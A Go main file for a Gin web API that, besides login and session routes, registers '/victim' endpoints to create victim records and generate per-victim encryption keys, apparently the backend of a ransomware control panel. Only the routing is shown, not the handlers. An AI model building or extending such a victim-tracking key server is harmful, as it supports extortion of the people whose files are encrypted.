package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
	swaggerfiles "github.com/swaggo/files"
	ginSwagger "github.com/swaggo/gin-swagger"
	"server.com/src/api/middleware"
	"server.com/src/api/routes"

	"server.com/src/config"
	_ "server.com/src/docs"
	"server.com/src/utils"
)

func main() {

	startupPort := flag.Int("server-port", utils.DEFAULT_PORT, "port to listen on")

	flag.Parse()

	if *startupPort > utils.MAX_PORT || *startupPort < 0 {
		log.Fatalf("port must be within 0..%d", utils.MAX_PORT)
	}

	store := cookie.NewStore([]byte(config.DATABASE_SETTINGS.CookieSecret))

	r := gin.Default()
	r.Use(sessions.Sessions(utils.SESSION_KEY, store))

	v1 := r.Group("/api/v1")
	{

		userGroup := v1.Group("/user")
		{
			userGroup.GET("/me", gin.WrapF(middleware.MiddlewareBody), routes.GetMe)
		}

		authGroup := v1.Group("/auth")
		{
			authGroup.GET("/connection-key", routes.ObtainConnectionKey)
			authGroup.POST("/login", routes.LoginUser)
			authGroup.POST("/create/user", routes.CreateUser)
			authGroup.POST("/logout", routes.Logout)
			authGroup.DELETE("/revoke/key", gin.WrapF(middleware.MiddlewareBody), routes.RevokeConnectionKey)
		}

		victimGroup := v1.Group("/victim", gin.WrapF(middleware.MiddlewareBody))
		{
			victimGroup.GET("/get", routes.GetVictim)
			victimGroup.POST("/create/victim", routes.CreateVictim)
			victimGroup.POST("/generate/encryption/key", routes.GenerateEncryptionKey)
		}

	}

	r.GET("/swagger/*any", ginSwagger.WrapHandler(swaggerfiles.Handler))

	r.Run(fmt.Sprintf("%s:%d", utils.IP_ADDRESS, uint16(*startupPort))) // listen and serve on 0.0.0.0:8080}

}
